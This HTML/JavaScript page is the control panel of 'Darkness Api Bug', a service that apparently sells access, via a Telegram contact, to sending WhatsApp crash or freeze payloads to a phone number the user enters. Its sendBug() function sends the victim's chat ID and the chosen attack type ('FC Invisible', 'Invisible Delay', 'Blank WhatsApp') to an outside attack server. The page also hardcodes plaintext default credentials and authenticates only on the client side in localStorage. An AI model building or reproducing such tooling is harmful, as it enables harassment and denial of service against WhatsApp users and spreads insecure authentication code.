<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Darkness</title>
  <!-- Tetap pakai icon -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --main: blue;
      --second: #aa55ff;
      --bg: #0e0e0e;
      --text: #eeeeee;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: sans-serif;
    }
    body {
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
    }
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .glass-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
      z-index: 2;
      max-width: 450px;
      width: 100%;
    }
    .profile {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-bottom: 25px;
    }
    .profile img {
      width: 200px;
      height: 200px;
      border-radius: 50%;
      border: 2px solid var(--main);
      box-shadow: 0 0 15px var(--main);
    }
    .profile-info h2 {
      font-size: 1.2rem;
      color: var(--main);
      margin-bottom: 10px;
      text-shadow: 0 0 8px var(--main);
    }
    .status {
      font-size: 0.9rem;
      color: #bbbb;
    }
    .status i {
      color: var(--main);
      margin-right: 5px;
    }
    h1 {
      font-size: 2.5rem;
      color: var(--main);
      margin-bottom: 20px;
      text-align: center;
      animation: neon 2s infinite alternate;
    }
    h3 {
      font-size: 1.4rem;
      color: #bbbb;
      margin-bottom: 20px;
      text-align: center;
    }
    .glitch {
      position: relative;
      animation: glitch 1s infinite;
    }
    @keyframes neon {
      from { text-shadow: 0 0 10px var(--main); }
      to { text-shadow: 0 0 25px var(--second); }
    }
    input, select {
      background: rgba(255, 255, 255, 0.05);
      color: white;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 12px;
      width: 100%;
      margin-bottom: 10px;
      transition: 0.3s;
    }
    input:focus, select:focus {
      outline: none;
      border: 1px solid var(--main);
      background: rgba(255, 255, 255, 0.1);
    }
    .bug-options {
      display: flex;
      gap: 10px;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 10px;
    }
    .bug-card {
      flex: 1;
      text-align: center;
      padding: 12px;
      border-radius: 12px;
      background: #111;
      color: white;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px rgba(0, 0, 255, 0.5); /* efek glow biru */
      border: 1px solid #444;
      max-width: 100px;
    }
    .bug-card i {
      font-size: 1.2rem;
      color: var(--main);
    }
    .bug-card span {
      font-size: 1rem;
      color: white;
    }
    .bug-card:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: scale(1.03);
    }
    .bug-card.active {
      border: 2px solid var(--main);
      box-shadow: 0 0 12px var(--main);
    }
    button {
      background: linear-gradient(135deg, var(--main), var(--second));
      border: none;
      color: black;
      width: 100%;
      padding: 14px;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 0 15px var(--main);
      transition: 0.3s;
      margin-top: 30px;
    }
    button-two {
      background: linear-gradient(135deg, var(--main), var(--second));
      border: none;
      color: black;
      width: 100%;
      padding: 14px;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 0 15px var(--main);
      transition: 0.3s;
      margin-top: 10px;
    }
    .user-table-wrapper {
      max-height: 200px;
      overflow-y: auto;
      margin-top: 10px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      padding-top: 10px;
    }
    .user-table-wrapper::-webkit-scrollbar {
      width: 6px;
    }
    .user-table-wrapper::-webkit-scrollbar-thumb {
      background: #666;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>
  <div id="login-box" class="glass-box">
  <h1 style="text-align: center;">Darkness Api Bug</h1>
    <h3>Login</h3>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
    <div id="login-result" style="margin-top:10px; text-align:center;"></div>
    <div class="contact" style="margin-top: 30px; color: white; text-align: center;">
        <p>Buy Akses Chat:</p>
        <a href="https://t.me/NotNotxxx" target="_blank" style="color: #00acee; text-decoration: none;">
          <i class="fab fa-telegram"></i> @Darkness
        </a>
      </div>
    </div>

  <div class="glass-box" id="main-box" style="display:none;">
    <div class="profile">
      <img src="https://files.catbox.moe/ybnudt.jpg" alt="profile">
      <div class="profile-info">
        <h2 id="userLabel" style="text-align: center;">Darkness Api Bug</h2>
        <span class="status"><i class="fas fa-circle" style="color:#00ff00"></i> Server Online</span>
      </div>
    </div>
    <input type="text" id="target" placeholder="Masukkan nomor target (cth: 628xxxx" />
    <div class="bug-options">
      <div class="bug-card active" data-bug="crashtotal">
        <span>FC Invisible</span>
      </div>
      <div class="bug-card" data-bug="delay">
        <span>Invisible Delay</span>
      </div>
      <div class="bug-card" data-bug="blank">
        <span>Blank WhatsApp</span>
      </div>
    </div>
    <button id="sendBtn" onclick="sendBug()"></i> Send Bug</button>
    <button-two onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button-two>
    <div class="contact" style="margin-top: 30px; color: white; text-align: center;">
        <p>Contact Developer:</p>
        <a href="https://t.me/NotNotxxx" target="_blank" style="color: #00acee; text-decoration: none;">
          <i class="fab fa-telegram"></i> @Darkness
        </a>
      </div>

    <div id="adminPanel" style="display:none; margin-top: 50px;">
      <h2 style="color: silver; text-align:center;"> Admin Setting
      </h2>

      <input id="newUser" placeholder="Username baru" />
      <input id="newPass" placeholder="Password" />
      <select id="newRole">
        <option value="user">User</option>
        <option value="admin">Admin</option>
      </select>

      <button onclick="addUser()">
        <i class="fas fa-user-plus"></i> Tambah User
      </button>

      <div class="user-table-wrapper">
        <table style="width: 100%; border-collapse: collapse; color:white; font-size: 0.9rem;">
          <thead>
            <tr>
              <th style="text-align:left;">Username</th>
              <th>Role</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody id="userTable"></tbody>
        </table>
      </div>

      <div id="result"></div>

      <div class="contact" style="margin-top: 30px; color: white; text-align: center;">
        <p>Contact Developer:</p>
        <a href="https://t.me/NotNotxxx" target="_blank" style="color: #00acee; text-decoration: none;">
          <i class="fab fa-telegram"></i> @Darkness
        </a>
      </div>
    </div>
  </div>

<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
<script>
particlesJS("particles-js", {
  particles: { number: { value: 60, density: { enable: true, value_area: 800 }},
  color: { value: "#ffffff" }, shape: { type: "circle" },
  opacity: { value: 0.4 }, size: { value: 3, random: true },
  line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.3, width: 1 },
  move: { enable: true, speed: 2, direction: "none", random: false }},
  interactivity: {
    events: { onhover: { enable: true, mode: "grab" }, onclick: { enable: false }},
    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
  }, retina_detect: true
});

const defaultUsers = [
  { username: "admin", password: "88", role: "admin" },
  { username: "cella", password: "bughunter", role: "user" },
  { username: "calista", password: "sandi123", role: "user" },
  { username: "darknes", password: "sandi123", role: "admin" }
];

function getUsers() {
  return JSON.parse(localStorage.getItem("userList")) || defaultUsers;
}

function saveUsers(users) {
  localStorage.setItem("userList", JSON.stringify(users));
}

function saveSession(user) {
  localStorage.setItem("currentUser", JSON.stringify(user));
}

function getSession() {
  return JSON.parse(localStorage.getItem("currentUser"));
}

function logout() {
  localStorage.removeItem("currentUser");
  location.reload();
}

window.onload = () => {
  if (!localStorage.getItem("userList")) saveUsers(defaultUsers);
  const user = getSession();
  if (user) showDashboard(user);
};

function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");

  const users = getUsers();
  const found = users.find(u => u.username === user && u.password === pass);

  if (found) {
    saveSession(found);
    showDashboard(found);
  } else {
    result.innerText = "‚ùå Username atau Password salah!";
    result.style.color = "crimson";
  }
}

function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
  document.getElementById("userLabel").innerText = user.username;

  if (user.role === "admin") {
    document.getElementById("adminPanel").style.display = "block";
    refreshUserTable();
  }
}

function refreshUserTable() {
  const table = document.getElementById("userTable");
  const users = getUsers();
  table.innerHTML = "";
  users.forEach((u, i) => {
    table.innerHTML += `<tr>
      <td>${u.username}</td>
      <td>${u.role}</td>
      <td><button onclick="deleteUser(${i})">üóëÔ∏è</button></td>
    </tr>`;
  });
}

function addUser() {
  const username = document.getElementById("newUser").value.trim();
  const password = document.getElementById("newPass").value.trim();
  const role = document.getElementById("newRole").value;

  if (!username || !password) return alert("Isi semua data user!");
  const users = getUsers();
  if (users.some(u => u.username === username)) return alert("Username sudah ada!");

  users.push({ username, password, role });
  saveUsers(users);
  refreshUserTable();
  document.getElementById("newUser").value = "";
  document.getElementById("newPass").value = "";
}

function deleteUser(index) {
  const users = getUsers();
  users.splice(index, 1);
  saveUsers(users);
  refreshUserTable();
}

let selectedBug = "crashtotal";
document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
    resDiv.innerText = "Masukkan nomor WA yang valid!";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://darknes.mydigital-store.me/darknes?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    const json = await res.json();
    resDiv.innerText = "‚úÖ " + json.message;
    resDiv.style.color = "#dddddd";
  } catch (err) {
    resDiv.innerText = "‚ùå Gagal fetch: " + err;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}
</script>
</body>
</html>
